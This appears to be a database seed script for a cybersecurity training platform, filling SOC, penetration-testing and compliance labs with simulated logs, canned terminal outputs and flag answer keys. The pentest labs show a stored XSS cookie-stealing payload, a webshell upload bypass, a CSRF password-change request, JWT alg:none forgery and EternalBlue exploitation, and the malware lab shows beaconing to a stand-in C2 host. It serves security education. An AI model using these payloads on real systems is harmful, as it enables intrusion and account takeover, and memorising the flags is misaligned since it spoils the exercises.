/**
 * Backfills interactive simulator content + per-module flag answers onto the
 * 9 existing labs (seeded by seed-dashboard.ts). Idempotent: matches labs by
 * slug and modules by their `order`, updating simulator config, flag, and
 * solutionExplanation. Safe to re-run.
 *
 * Flags are stored server-side only and validated case-insensitively (trimmed,
 * whitespace-collapsed). They are NEVER returned to the client.
 */
import { eq } from "drizzle-orm";
import { db, labsTable, labModulesTable } from "@workspace/db";

type ModuleContent = { flag: string; solutionExplanation: string };
type LabContent = { simulator: unknown; modules: ModuleContent[] };

const CONTENT: Record<string, LabContent> = {
  // ───────────────────────────── SOC ─────────────────────────────
  "siem-alert-investigation": {
    simulator: {
      kind: "siem",
      title: "Splunk — Windows Security Events",
      description:
        "Search and filter the Windows Security log. Use the search box to find Event IDs, source IPs and accounts. EventID 4625 = failed logon, 4624 = successful logon.",
      fields: ["timestamp", "eventId", "sourceIp", "account", "message", "severity"],
      logs: [
        { timestamp: "2026-06-14T13:58:02Z", eventId: "4624", sourceIp: "10.0.4.21", account: "j.rao", message: "An account was successfully logged on (interactive).", severity: "info" },
        { timestamp: "2026-06-14T14:01:11Z", eventId: "4625", sourceIp: "203.0.113.45", account: "administrator", message: "An account failed to log on. Status: 0xC000006A (bad password).", severity: "warning" },
        { timestamp: "2026-06-14T14:01:13Z", eventId: "4625", sourceIp: "203.0.113.45", account: "administrator", message: "An account failed to log on. Status: 0xC000006A (bad password).", severity: "warning" },
        { timestamp: "2026-06-14T14:01:16Z", eventId: "4625", sourceIp: "203.0.113.45", account: "administrator", message: "An account failed to log on. Status: 0xC000006A (bad password).", severity: "warning" },
        { timestamp: "2026-06-14T14:01:19Z", eventId: "4625", sourceIp: "203.0.113.45", account: "admin", message: "An account failed to log on. Status: 0xC000006A.", severity: "warning" },
        { timestamp: "2026-06-14T14:01:55Z", eventId: "4625", sourceIp: "203.0.113.45", account: "administrator", message: "47 failed attempts in 90s — classic password spray/brute-force pattern.", severity: "high" },
        { timestamp: "2026-06-14T14:02:08Z", eventId: "4624", sourceIp: "203.0.113.45", account: "administrator", message: "An account was successfully logged on (network). LogonType 3.", severity: "critical" },
        { timestamp: "2026-06-14T14:03:30Z", eventId: "4672", sourceIp: "203.0.113.45", account: "administrator", message: "Special privileges assigned to new logon (SeDebugPrivilege).", severity: "critical" },
        { timestamp: "2026-06-14T14:05:10Z", eventId: "4688", sourceIp: "203.0.113.45", account: "administrator", message: "New process created: powershell.exe -enc <base64>.", severity: "critical" },
      ],
    },
    modules: [
      { flag: "4625", solutionExplanation: "The triggering events are EventID 4625 (failed logon). Dozens fire from one source in seconds — the brute-force signature." },
      { flag: "true positive", solutionExplanation: "47 failed 4625s followed by a successful 4624 from the same external IP confirms a successful brute-force — a true positive." },
      { flag: "203.0.113.45", solutionExplanation: "All failed and the successful logon originate from 203.0.113.45 — pivot all further hunting on this source IP." },
      { flag: "FLAG{brute_force_confirmed}", solutionExplanation: "Incident ticket: external brute-force against 'administrator' from 203.0.113.45 succeeded at 14:02, followed by privilege escalation (4672) and encoded PowerShell (4688)." },
    ],
  },
  "threat-hunting-wazuh": {
    simulator: {
      kind: "siem",
      title: "Wazuh — Enterprise Hunt Dataset",
      description:
        "Hunt across authentication and Sysmon telemetry for lateral movement. Rows include MITRE technique tags (rule.mitre.id) where Wazuh rules fired.",
      fields: ["timestamp", "eventId", "sourceIp", "account", "host", "message", "mitre"],
      logs: [
        { timestamp: "2026-06-12T09:14:00Z", eventId: "4624", sourceIp: "10.0.4.50", account: "m.iyer", host: "WS-FIN-07", message: "Normal interactive logon.", mitre: "-" },
        { timestamp: "2026-06-12T14:03:00Z", eventId: "4624", sourceIp: "198.51.100.22", account: "svc_backup", host: "WS-FIN-07", message: "First anomalous logon — service account interactive from external IP. INITIAL ACCESS.", mitre: "T1078" },
        { timestamp: "2026-06-12T14:06:40Z", eventId: "1", sourceIp: "198.51.100.22", account: "svc_backup", host: "WS-FIN-07", message: "Sysmon ProcessCreate: psexec.exe \\\\FIN-DB-01 -u admin.", mitre: "T1021.002" },
        { timestamp: "2026-06-12T14:07:10Z", eventId: "4624", sourceIp: "10.0.4.21", account: "svc_backup", host: "FIN-DB-01", message: "Network logon to database server via SMB. LATERAL MOVEMENT.", mitre: "T1021.002" },
        { timestamp: "2026-06-12T14:09:55Z", eventId: "1", sourceIp: "10.0.4.21", account: "svc_backup", host: "FIN-DB-01", message: "ProcessCreate: sqlcmd.exe -Q 'SELECT * FROM payroll'.", mitre: "T1005" },
        { timestamp: "2026-06-12T14:12:30Z", eventId: "3", sourceIp: "10.0.4.21", account: "svc_backup", host: "FIN-DB-01", message: "Network connection to 198.51.100.22:443 — likely exfil.", mitre: "T1041" },
      ],
    },
    modules: [
      { flag: "14:03", solutionExplanation: "Initial access is the 14:03 logon (EventID 4624) by svc_backup from external IP 198.51.100.22 — a service account should never log on interactively from outside." },
      { flag: "T1021.002", solutionExplanation: "PsExec over SMB maps to MITRE ATT&CK T1021.002 (Remote Services: SMB/Windows Admin Shares)." },
      { flag: "FIN-DB-01", solutionExplanation: "The attacker pivoted from WS-FIN-07 to FIN-DB-01 over SMB (network logon at 14:07), then ran sqlcmd against payroll data." },
      { flag: "FLAG{lateral_movement_via_smb}", solutionExplanation: "Hunt report: compromised svc_backup, PsExec/SMB lateral movement WS-FIN-07 → FIN-DB-01, data collection via sqlcmd, exfil to 198.51.100.22:443. IOCs: 198.51.100.22, svc_backup." },
    ],
  },
  "malware-analysis-basic": {
    simulator: {
      kind: "terminal",
      title: "Analysis VM — sample.exe",
      prompt: "analyst@remnux:~/sample$",
      description:
        "Static & dynamic malware analysis toolbox. Run the tools below against sample.exe. Try: `strings sample.exe`, `pestudio sample.exe`, `procmon`, `tcpdump`, `help`.",
      commands: {
        help: "Available: strings sample.exe | pestudio sample.exe | procmon | tcpdump | yara-init | ls",
        ls: "sample.exe  notes.txt",
        "strings sample.exe":
          "kernel32.dll\nVirtualAlloc\nInternetOpenA\nhttp://evil-c2.example.net/gate.php\nsvch0st.exe\nMZ...\n[+] 412 strings extracted",
        "pestudio sample.exe":
          "indicators:\n  - packed: yes (UPX)\n  - imports: WININET.dll (InternetOpenA, HttpSendRequestA)\n  - suspicious string: http://evil-c2.example.net\n  - compile-time: 2026-05-30",
        procmon:
          "ProcMon capture:\n  sample.exe -> CreateProcess svch0st.exe (masquerading as svchost)\n  svch0st.exe -> RegSetValue HKCU\\...\\Run\\Updater\n  svch0st.exe -> WriteFile %APPDATA%\\svch0st.exe",
        tcpdump:
          "12:01:03 IP host.50212 > evil-c2.example.net.80: HTTP GET /gate.php?id=VICTIM01\n12:01:03 IP evil-c2.example.net.80 > host: 200 OK (C2 beacon)",
        "yara-init": "Template written to detect.yar. Add strings + condition, then submit FLAG{yara_rule_written}.",
      },
    },
    modules: [
      { flag: "http://evil-c2.example.net/gate.php", solutionExplanation: "`strings` / `pestudio` reveal the embedded C2 URL http://evil-c2.example.net/gate.php and WININET imports used for beaconing." },
      { flag: "svch0st.exe", solutionExplanation: "ProcMon shows the sample spawns svch0st.exe (note the zero) masquerading as svchost, and persists it via HKCU Run key." },
      { flag: "evil-c2.example.net", solutionExplanation: "tcpdump confirms HTTP beaconing to the C2 host evil-c2.example.net (GET /gate.php). This is the command-and-control infrastructure." },
      { flag: "FLAG{yara_rule_written}", solutionExplanation: "A YARA rule keyed on the strings 'svch0st.exe' and 'evil-c2.example.net' plus the UPX packing detects this family. Run yara-init for the template." },
    ],
  },
  // ───────────────────────────── VAPT ─────────────────────────────
  "dvwa-web-exploitation": {
    simulator: {
      kind: "terminal",
      title: "Kali — DVWA target (10.10.10.5)",
      prompt: "kali@attacker:~$",
      description:
        "Exploit OWASP Top 10 bugs in DVWA. Each successful exploit prints a FLAG{...} token. Try `help` for the command list.",
      commands: {
        help: "sqlmap -u 'http://10.10.10.5/vuln?id=1' --dump | curl-xss | upload-shell | csrf-attack | ls",
        ls: "shell.php  payloads.txt",
        "sqlmap -u 'http://10.10.10.5/vuln?id=1' --dump":
          "[*] testing 'id' parameter... injectable (boolean-based blind)\nDatabase: dvwa\nTable: users\n+----+----------+----------------------------------+----------------------+\n| id | user     | password (md5)                   | flag                 |\n+----+----------+----------------------------------+----------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | FLAG{sql1_dump3d}    |\n+----+----------+----------------------------------+----------------------+",
        "curl-xss":
          "POST /vulnerabilities/xss_s/ name=<script>alert(document.cookie)</script>\nStored payload executed on victim view. Reflected token: FLAG{st0red_xss}",
        "upload-shell":
          "Renaming shell.php -> shell.php%00.jpg ... upload accepted (type check bypassed).\nGET /uploads/shell.php?cmd=id -> uid=33(www-data)\nFLAG{w3bsh3ll_rce}",
        "csrf-attack":
          "Crafted: GET /vulnerabilities/csrf/?password_new=pwned&password_conf=pwned\nVictim browser auto-submitted. Admin password changed.\nFLAG{csrf_pwn3d}",
      },
    },
    modules: [
      { flag: "FLAG{sql1_dump3d}", solutionExplanation: "`sqlmap --dump` confirms a boolean-based blind SQLi in `id` and dumps the users table (admin md5 = 'password'). Token: FLAG{sql1_dump3d}." },
      { flag: "FLAG{st0red_xss}", solutionExplanation: "A stored XSS in the guestbook (`name` field) executes <script>alert(document.cookie)</script> on every viewer. Token: FLAG{st0red_xss}." },
      { flag: "FLAG{w3bsh3ll_rce}", solutionExplanation: "The upload filter is bypassed with a double-extension/null-byte trick; the PHP webshell then runs commands as www-data. Token: FLAG{w3bsh3ll_rce}." },
      { flag: "FLAG{csrf_pwn3d}", solutionExplanation: "No anti-CSRF token on the password-change form lets a forged GET change the admin password. Token: FLAG{csrf_pwn3d}." },
    ],
  },
  "network-enum-exploit": {
    simulator: {
      kind: "terminal",
      title: "Kali — target 10.10.10.20",
      prompt: "kali@attacker:~$",
      description:
        "Enumerate, find a CVE, exploit, and escalate. Tools: nmap, msfconsole. Type `help`.",
      commands: {
        help: "nmap -sV 10.10.10.20 | nmap --script vuln 10.10.10.20 | msfconsole | getsystem",
        "nmap -sV 10.10.10.20":
          "PORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds Windows 7 SP1 (SMBv1 enabled)\n3389/tcp open ms-wbt-server\nFLAG{p0rts_enumerated}",
        "nmap --script vuln 10.10.10.20":
          "Host script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE: Remote Code Execution (MS17-010 / EternalBlue)\n|   State: VULNERABLE\n|   Risk: CRITICAL",
        msfconsole:
          "msf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS 10.10.10.20; run\n[*] Meterpreter session 1 opened\nmeterpreter > FLAG{eternalblue_shell}",
        getsystem:
          "meterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation).\nmeterpreter > getuid -> NT AUTHORITY\\SYSTEM\nFLAG{nt_authority_system}",
      },
    },
    modules: [
      { flag: "FLAG{p0rts_enumerated}", solutionExplanation: "`nmap -sV` reveals SMBv1 on 445 (Windows 7 SP1) plus RDP — the enumeration baseline. Token: FLAG{p0rts_enumerated}." },
      { flag: "MS17-010", solutionExplanation: "`nmap --script vuln` flags smb-vuln-ms17-010 (EternalBlue), a critical SMBv1 RCE — the exploitable CVE family." },
      { flag: "FLAG{eternalblue_shell}", solutionExplanation: "Metasploit's ms17_010_eternalblue yields a Meterpreter session (initial access). Token: FLAG{eternalblue_shell}." },
      { flag: "FLAG{nt_authority_system}", solutionExplanation: "`getsystem` escalates to NT AUTHORITY\\SYSTEM via named-pipe impersonation. Token: FLAG{nt_authority_system}." },
    ],
  },
  "api-security-testing": {
    simulator: {
      kind: "terminal",
      title: "API target — https://api.shopdemo.test",
      prompt: "tester@kali:~$",
      description:
        "Test a REST API for BOLA, JWT flaws and mass assignment. You are user 'alice' (id 1001). Type `help`.",
      commands: {
        help: "curl /api/orders/1002 (BOLA) | jwt-forge | curl-register | ls",
        "curl /api/orders/1002":
          "GET /api/orders/1002 Authorization: Bearer <alice>\n200 OK {\"orderId\":1002,\"owner\":\"bob\",\"total\":\"₹84,990\",\"flag\":\"FLAG{bola_idor}\"}\n# You read another user's order — Broken Object Level Authorization.",
        "jwt-forge":
          "Original header {\"alg\":\"HS256\"} -> tamper to {\"alg\":\"none\"}, set {\"role\":\"admin\"}, strip signature.\nGET /api/admin/users with forged token -> 200 OK\nFLAG{jwt_none_alg}",
        "curl-register":
          "POST /api/register {\"email\":\"x@x.com\",\"password\":\"x\",\"role\":\"admin\"}\n201 Created {\"id\":1099,\"role\":\"admin\"}  # role accepted via mass assignment\nFLAG{mass_assign_admin}",
        ls: "report-template.md",
      },
    },
    modules: [
      { flag: "FLAG{bola_idor}", solutionExplanation: "Incrementing the order id (1002) returns another user's order — Broken Object Level Authorization (BOLA/IDOR). Token: FLAG{bola_idor}." },
      { flag: "FLAG{jwt_none_alg}", solutionExplanation: "The API accepts alg:none, so a forged unsigned token with role:admin is trusted. Token: FLAG{jwt_none_alg}." },
      { flag: "FLAG{mass_assign_admin}", solutionExplanation: "The register endpoint binds the whole body, so passing role:admin self-grants admin (mass assignment). Token: FLAG{mass_assign_admin}." },
      { flag: "FLAG{api_report_done}", solutionExplanation: "Report the three issues with CVSS: BOLA (8.6 High), JWT none (9.1 Critical), mass assignment (8.1 High). Completion token: FLAG{api_report_done}." },
    ],
  },
  // ───────────────────────────── GRC ─────────────────────────────
  "iso27001-risk-assessment": {
    simulator: {
      kind: "grc",
      title: "Acme Fintech — ISMS Workpapers",
      description:
        "Use the asset register, risk matrix and Annex A control list to answer each task. Read the documents on the left, then submit the requested value.",
      documents: [
        {
          title: "Asset Register",
          body: "A1 Customer Database — Confidential — Owner: DBA\nA2 Payroll System — Confidential — Owner: HR\nA3 Marketing Website — Public\nA4 Source Code Repo — Confidential — Owner: CTO\nA5 Office Wi-Fi — Internal\nA6 Backup Tapes — Confidential — Owner: IT Ops\n(4 assets classified Confidential)",
        },
        {
          title: "Risk Matrix (Likelihood × Impact, 1–5)",
          body: "R1 Customer Database breach — Likelihood 4 × Impact 5 = 20 (highest)\nR2 Ransomware on Payroll — 3 × 4 = 12\nR3 Website defacement — 2 × 2 = 4\nR4 Insider source-code theft — 3 × 4 = 12",
        },
        {
          title: "Annex A Control Reference",
          body: "A.5.15 Access control\nA.8.24 Use of cryptography\nA.8.16 Monitoring activities\nA.5.7 Threat intelligence",
        },
      ],
    },
    modules: [
      { flag: "4", solutionExplanation: "Customer DB, Payroll, Source Code Repo and Backup Tapes are Confidential → 4 Confidential assets." },
      { flag: "Customer Database", solutionExplanation: "R1 (Customer Database breach) scores 4×5 = 20, the highest inherent risk — it owns the most sensitive data." },
      { flag: "20", solutionExplanation: "The top risk's score is Likelihood 4 × Impact 5 = 20 on the risk matrix." },
      { flag: "A.8.24", solutionExplanation: "Encryption of the customer database (data at rest/in transit) maps to Annex A control A.8.24 'Use of cryptography', directly mitigating the top risk." },
    ],
  },
  "dpdp-compliance-audit": {
    simulator: {
      kind: "grc",
      title: "DataKart Pvt Ltd — DPDP Audit Pack",
      description:
        "Audit this Data Fiduciary against the DPDP Act 2023. Read the evidence and submit each finding.",
      documents: [
        {
          title: "Consent Notice (current)",
          body: "Users tick a single 'I agree' box at signup covering ALL purposes. There is no granular choice and NO mechanism for a Data Principal to WITHDRAW consent after signup. DPDP s.6(4)-(6) requires withdrawal to be as easy as giving consent.",
        },
        {
          title: "Data Flow Map",
          body: "Signup data → core service (legal basis: consent ✔)\nPayment data → processor (legal basis: contract ✔)\nBehavioural data → marketing analytics vendor (legal basis: NONE on record ✘)\nSupport tickets → CRM (consent ✔)",
        },
        {
          title: "Breach Runbook",
          body: "On detection, notify the Data Protection Board and affected Data Principals 'without delay'. Internal SLA documented = 72 hours. Current process only emails IT, no Board notification step.",
        },
      ],
    },
    modules: [
      { flag: "withdrawal", solutionExplanation: "The consent notice is bundled and provides no way to withdraw consent — a DPDP s.6 violation. The missing element is consent withdrawal." },
      { flag: "marketing analytics", solutionExplanation: "Behavioural data shared with the marketing analytics vendor has no legal basis recorded — processing without a lawful ground." },
      { flag: "72 hours", solutionExplanation: "The documented breach-notification SLA is 72 hours, but the runbook lacks the required Data Protection Board notification step." },
      { flag: "FLAG{dpdp_audit_complete}", solutionExplanation: "Audit report: bundled consent + no withdrawal (High), marketing processing without legal basis (High), incomplete breach notification (Medium). Completion token: FLAG{dpdp_audit_complete}." },
    ],
  },
  "vendor-risk-assessment": {
    simulator: {
      kind: "grc",
      title: "Vendor: CloudPay Services — TPRM File",
      description:
        "Run a third-party risk assessment. Use the profile, questionnaire results and control evidence to classify and treat the risk.",
      documents: [
        {
          title: "Vendor Profile",
          body: "CloudPay processes customer PII AND cardholder payment data, integrated into the core checkout. Data access: PII + Payment. Business impact if down: checkout halts. → Inherent risk class: Critical.",
        },
        {
          title: "CAIQ-lite Results (35 questions)",
          body: "Passed: 30. Gaps identified: 5 — (1) no SOC 2 report, (2) no encryption-at-rest evidence, (3) no documented BCP, (4) no breach-notification SLA, (5) no sub-processor list.",
        },
        {
          title: "Residual Risk & Treatment Guide",
          body: "Existing compensating controls: contractual DPA + network isolation. After controls, residual risk = Medium. Options: Accept / Mitigate / Transfer / Avoid. With 5 open gaps on a Critical vendor, the recommended decision is Mitigate (require remediation before go-live).",
        },
      ],
    },
    modules: [
      { flag: "Critical", solutionExplanation: "CloudPay has access to PII + payment data and is in the checkout critical path → inherent risk classification is Critical." },
      { flag: "5", solutionExplanation: "The CAIQ-lite shows 30 passed / 5 gaps (SOC 2, encryption-at-rest, BCP, breach SLA, sub-processor list)." },
      { flag: "Medium", solutionExplanation: "After the DPA and network-isolation compensating controls, residual risk drops to Medium." },
      { flag: "Mitigate", solutionExplanation: "A Critical vendor with 5 open gaps should not be accepted as-is; the right treatment is Mitigate — require remediation before go-live." },
    ],
  },
};

async function main() {
  let labsUpdated = 0;
  let modulesUpdated = 0;

  for (const [slug, content] of Object.entries(CONTENT)) {
    const lab = await db.query.labsTable.findFirst({ where: eq(labsTable.slug, slug) });
    if (!lab) {
      console.log(`  ⚠️  Lab not found: ${slug} (run seed:dashboard first)`);
      continue;
    }

    await db.update(labsTable).set({ simulator: content.simulator }).where(eq(labsTable.id, lab.id));
    labsUpdated++;

    const modules = await db
      .select()
      .from(labModulesTable)
      .where(eq(labModulesTable.labId, lab.id))
      .orderBy(labModulesTable.order);

    for (let i = 0; i < modules.length && i < content.modules.length; i++) {
      const m = modules[i];
      const c = content.modules[i];
      await db
        .update(labModulesTable)
        .set({ flag: c.flag, solutionExplanation: c.solutionExplanation })
        .where(eq(labModulesTable.id, m.id));
      modulesUpdated++;
    }
    console.log(`  ✅ ${slug}: simulator + ${Math.min(modules.length, content.modules.length)} module flags`);
  }

  console.log(`\nDone. Labs updated: ${labsUpdated}, modules updated: ${modulesUpdated}.`);
  process.exit(0);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
